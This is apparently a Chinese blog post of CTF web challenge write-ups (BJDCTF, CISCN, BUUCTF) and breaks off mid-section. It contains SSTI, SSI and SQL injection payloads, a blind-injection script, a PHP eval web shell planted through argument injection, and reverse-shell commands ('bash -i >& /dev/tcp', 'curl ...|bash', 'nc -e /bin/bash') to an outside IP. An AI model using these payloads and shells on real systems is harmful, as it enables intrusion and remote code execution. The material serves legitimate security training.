<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure>

<p>filter会删除flag，img被反序列化。得到flag的位置，改一下payload就可以了。</p>
<h4 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h4><p>存在 .swp 备份，先爆破 md6</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> hashlib</span><br><span class="line"><span class="attribute">def</span> md<span class="number">5</span>(s):</span><br><span class="line">    <span class="attribute">return</span> hashlib.md<span class="number">5</span>(s.encode(&#x27;utf-<span class="number">8</span>&#x27;)).hexdigest()</span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">1</span>, <span class="number">10000000</span>):</span><br><span class="line">    <span class="attribute">if</span> md<span class="number">5</span>(str(i)).startswith(&#x27;<span class="number">6</span>d<span class="number">0</span>bc<span class="number">1</span>&#x27;):</span><br><span class="line">        <span class="attribute">print</span>(i)</span><br><span class="line">        <span class="attribute">break</span></span><br></pre></td></tr></table></figure>

<p>得到2020666，在返回包头看见文件，进入。这个文件是一个 shtml 文件，存在模板注入。</p>
<p>返回 index，用户名处输入payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;命令&quot;--&gt;</span> # 此处使用 ls</span><br></pre></td></tr></table></figure>

<p>发现文件 flag ，访问可以得到flag</p>
<h4 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h4><p>有个爆破密码的功能，扫下目录发现 test.php，应该是要用这个功能爆破 test 的密码。</p>
<p>看一下 cookie，有个 base64加密的值，<code>user=1589337171</code>，不知道是什么，先改一改，改成<code>999999999999999999</code>，刷新发现页面变了</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Already burst -<span class="number">999999998410662300</span> <span class="built_in">sec</span>, <span class="number">122930</span> p/s</span><br><span class="line"><span class="built_in">Forecast</span> success <span class="built_in">rate</span> NaN%</span><br></pre></td></tr></table></figure>

<p>刚才的 user 应该是时间，但是改完变成负的了，再改成0试试。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Already</span> burst <span class="number">1589337868</span> sec, <span class="number">142033</span> p/s</span><br><span class="line"><span class="attribute">Forecast</span> success rate <span class="number">99</span>.<span class="number">57694165675845</span>%</span><br></pre></td></tr></table></figure>

<p>再 check 成功了，弹出密码<code>av11664517@1583985203</code>，查一下这个av号，是北京大学量子力学的视频，flag 在评论里，脚本跑一下。</p>
<h4 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h4><p>下载源代码<code>.index.php.swp</code>，使用 <code>vim -r index.php.swp</code>恢复</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);          &#123;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">&#125;      &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了符号，不能使用变量拼接。禁用了 base64 ，也不能编码绕过。需要反弹sehll</p>
<p>申请小号，开一个 linux lab，在 <code>/var/www/html</code>下写反弹shell</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/<span class="number">174.1</span><span class="number">.54</span><span class="number">.235</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>&#x27; &gt; a</span><br></pre></td></tr></table></figure>

<p>监听</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>到 web 页面 POST</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=curl <span class="attr">http:</span><span class="comment">//174.1.54.235/a|bash</span></span><br></pre></td></tr></table></figure>

<p>遇到了问题，bash 会自动退出，原因不明，改成 nc 反弹 shell，监听</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p>POST</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=nc <span class="number">174.1</span><span class="number">.54</span><span class="number">.235</span> <span class="number">9999</span> -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>成功得到shell</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> / -name flag</span><br><span class="line">cat <span class="regexp">/etc/</span>demo<span class="regexp">/P3rh4ps/</span>love<span class="regexp">/you/</span>flag</span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h4><p>提示 cookie，在 flag 页面输入 admin，刷新抓包可以看到 cookie 里面有一个 user 字段，同时页面上显示 Hello，admin。输入</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">1</span>+<span class="number">1</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>得到2，模板注入。burp 里把 user 字段改成下面的值</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">_self.env.registerUndefinedFilterCallback</span>(<span class="name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;<span class="name">_self.env.getFilter</span>(<span class="name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="xml">;</span></span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h4><p>代码审计，<code>/?text=php://input&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code>，POST <code>I have a dream</code>，得到 next.php 源码，也可以用<code>data://text/plain,I%20have%20a%20dream</code></p>
<p>next.php 存在带 <code>/e</code>的 preg_replace，<code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
<h4 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h4><p>Hint 里提到知道 IP，抓包改 XFF，显示的 IP 就会变，想到模板注入</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">X-Forwarded-For: </span><span class="template-variable">&#123;&#123;<span class="name">1</span>+<span class="number">1</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>显示了2，确实存在模板注入，模板是 Smarty</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">X-Forwarded-For: </span><span class="template-variable">&#123;&#123;<span class="name">system</span>(<span class="name">&quot;cat /flag&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h4><p>打个引号就告诉我 Stop hacking，看下 robots.txt，有 hint.txt</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can <span class="builtin-name">get</span> the flag</span><br><span class="line"><span class="keyword">and</span> p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>过滤了<code>select</code>，<code>=</code>，<code>&#39;</code>，<code>union</code>，<code>and</code>，<code>;</code>，<code>&quot;</code></p>
<p>可以在username 使用<code>\</code>转义单引号，就可以在 password 处执行查询了，之后就是常规盲注。抄个脚本：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="attr">url</span> = <span class="string">&quot;http://bc5d0433-45b5-486d-8fdd-541a8662fd10.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">data</span> = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="attr">result</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="attr">i</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">while( True ):</span><br><span class="line">	<span class="attr">i</span> = i + <span class="number">1</span> </span><br><span class="line">	<span class="attr">head=32</span></span><br><span class="line">	<span class="attr">tail=127</span></span><br><span class="line"></span><br><span class="line">	while( head &lt; tail ):</span><br><span class="line">		<span class="attr">mid</span> = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">#payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span></span><br><span class="line">		<span class="attr">payload</span> = <span class="string">&quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;</span>%(i,mid)</span><br><span class="line">		</span><br><span class="line">		data[&#x27;password&#x27;] = payload</span><br><span class="line">		<span class="attr">r</span> = requests.post(url,<span class="attr">data=data)</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;stronger&quot;</span> <span class="keyword">in</span> r.text :</span><br><span class="line">			<span class="attr">head</span> = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="attr">tail</span> = mid</span><br><span class="line">	</span><br><span class="line">	<span class="attr">last</span> = result</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">		result += chr(head)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		break</span><br><span class="line">	print(result)</span><br></pre></td></tr></table></figure>





<h4 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h4><p>git 源码泄露</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = $<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;y<span class="string">&#x27;d&#x27;</span>s</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>看着很复杂，不要有思维定势觉得一定要走到最后一行，实际上在<code>exit()</code>中就可以得到结果。几个 exit 条件中，不传入 flag 的这一条最容易实现，会输出 <code>$yds</code>，所以直接 GET 传入<code>yds=flag</code>，会把真正的flag赋值给<code>$yds</code>，再 exit 就得到了flag。</p>
<h4 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h4><p>同时使用escapechellargs和escapeshellcmd会出现问题，用单引号包含的参数会导致参数注入。</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;</span></span><br><span class="line"><span class="xml"># escapeshellargs先对单引号转义</span></span><br><span class="line"><span class="xml">\&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php \&#x27;</span></span><br><span class="line"><span class="xml"># 然后对反斜线分隔的每个部分加单引号</span></span><br><span class="line"><span class="xml">&#x27;&#x27;\&#x27;&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="xml"># escapeshellcmd对其他特殊字符转义，但不转义单引号</span></span><br><span class="line"><span class="xml">&#x27;&#x27;\\&#x27;&#x27; \<span class="tag">&lt;<span class="name">\?php</span> \@<span class="attr">eval</span>(\$<span class="attr">_POST</span>\[\&quot;<span class="attr">hack</span>\&quot;\]);\?\&gt;</span> -oG hack.php &#x27;\\&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h4><p>有robots.txt，看到*.php.bak，看看index的源码，有个image.php还有user.php，image.php.bak可以下载。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>addslashes在单双引号、反斜杠和空字符前加上反斜杠，strreplace把数组中的内容删除。</p>
<p>这里思路窄了，以为只要一个位置就可以，怎么也弄不出来单引号。但实际上在path后面有一个单引号，只要有一个反斜杠来转义id后面的引号就可以了。可以使用<code>\\0</code>，addslashes变成<code>\\\\0</code>，strreplace变成<code>\</code>。由于没有显示位，使用布尔盲注。当id=1时有图片，id=0时显示有错误。</p>
<h4 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h4><p>函数：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">scandir() </span><span class="comment"># 返回指定目录中的文件和目录的数组</span></span><br><span class="line"><span class="keyword">base_convert() </span><span class="comment"># 转换禁止</span></span><br><span class="line">dechex() <span class="comment"># 十进制转为十六进制</span></span><br><span class="line">hex<span class="symbol">2b</span>in() <span class="comment"># 十六进制转为ASCII字符</span></span><br><span class="line">var_dump() <span class="comment"># 输出变量信息</span></span><br><span class="line">readfile() <span class="comment"># 输出文件</span></span><br></pre></td></tr></table></figure>

<p>特性：</p>
<ul>
<li>动态函数：可以把函数名用字符串传递给变量，通过此变量动态调用函数。<code>$func=&#39;die&#39;;$func();</code></li>
<li>函数名默认为字符串</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不能出现blacklist中的内容，preg_match_all得到的内容必须在whitelist里，同时payload有长度限制。</p>
<p>方法一：构造<code>$_GET</code></p>
